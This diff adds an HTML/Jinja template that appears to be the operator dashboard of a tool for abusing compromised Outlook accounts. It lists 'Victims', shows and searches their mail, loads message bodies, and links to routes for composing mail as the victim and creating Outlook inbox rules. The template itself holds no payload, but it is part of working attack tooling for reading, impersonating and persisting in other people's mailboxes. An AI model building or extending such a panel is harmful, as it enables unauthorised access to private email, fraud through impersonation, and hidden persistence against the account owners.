@@ -1,0 +1,95 @@
+{% extends "layout.html" %}
+{% block body %}
+
+    <!-- partial -->
+    <div class="main-panel">
+      <div class="content-wrapper">
+        <div class="email-wrapper wrapper">
+          <div class="row align-items-stretch">
+            <div class="mail-sidebar d-none d-lg-block col-md-2 pt-3 bg-white">
+              <div class="menu-bar">
+                <div class="wrapper">
+                  <div class="online-status d-flex justify-content-between align-items-center">
+                  <p class="chat">Victims</p>
+                </div>
+                </div>
+                <ul class="profile-list">
+                  {% for user in victims %}
+                  <li class="profile-list-item"> 
+                    <a href="?victim={{ user[0] }}"> 
+                      <div class="user"><p class="u-name">{{ user[0] }}
+                      </div> 
+                    </a>
+                  </li>
+                  
+                  {% endfor %}
+                </ul>
+              </div>
+            </div>
+            
+            <div class="mail-list-container col-md-3 pt-4 pb-4 border-right bg-white">
+              {% if user %}
+                <div class="border-bottom pb-4  px-3">
+                    <b>{{ user }}</b>
+                    <div class="pt-3 align-items-center">
+                    <a href="{{ url_for('sendmail', sender=user) }}" target=_blank class="compose mb-3" ><button class="btn btn-success me-2">Compose</button></a>
+                    <a href="{{ url_for('createRules', victim=user) }}" target=_blank class="compose mb-3" ><button class="btn btn-primary me-2">Outlook Rules</button></a>
+                  </div>
+                </div>
+                <div class="border-bottom">
+                  <form>
+                    <input type="hidden" value="{{user}}" name="victim">
+                  <input class="form-control" id="displaySearch" name="displayName" placeholder="Search for a keyword" type="text" value="{{ search }}" >
+                  </form>
+              {% endif %}
+            </div>
+            <div class="table-wrapper-scroll-y my-custom-scrollbar">
+              {% for subject in subjects %}
+              <div class="mail-list-href">
+              <a class="text-primary" onclick="getbody('{{subject[3]}}','{{subject[0]}}')">
+                <div class="mail-list" id="{{subject[0]}}">
+                  <div class="content">
+                    <p class="sender-name">{{ subject.Sender }}</p>
+                    <p class="message_text">{{ subject.Subject }}</p>
+                  </div>
+                  <div class="details">
+                    {% if subject.HasAttachments == 'True' %}
+                    <i class="menu-icon mdi mdi-attachment favorite"></i>
+                    {%  endif %}
+                  </div>
+                </div>
+            </a>
+          </div>
+              {% endfor %}
+            </div>
+          </div>
+          
+          <div class="mail-view d-none d-md-block col-md-9 col-lg-7 bg-white" id="full-mail">
+              
+            </div>
+          </div>
+        </div>
+      </div>
+      </div>
+
+      <script src="{{ url_for('static',filename='js/jquery.min.js') }}"></script>
+
+      <script>
+var addclass = 'bg-primary text-white';
+var $cols = $('.mail-list').click(function(e) {
+    $cols.removeClass(addclass);
+    $(this).addClass(addclass);
+});
+        function getbody(email, id){
+
+          var xhttp = new XMLHttpRequest();
+          xhttp.onreadystatechange = function() {
+              if (this.readyState == 4 && this.status == 200) {
+                document.getElementById("full-mail").innerHTML = xhttp.responseText;
+              }
+          };
+          xhttp.open("GET", "{{url_for('outlook')}}?victim="+email+"&id="+id, true);
+          xhttp.send();
+        }
+      </script>
+{% endblock %}
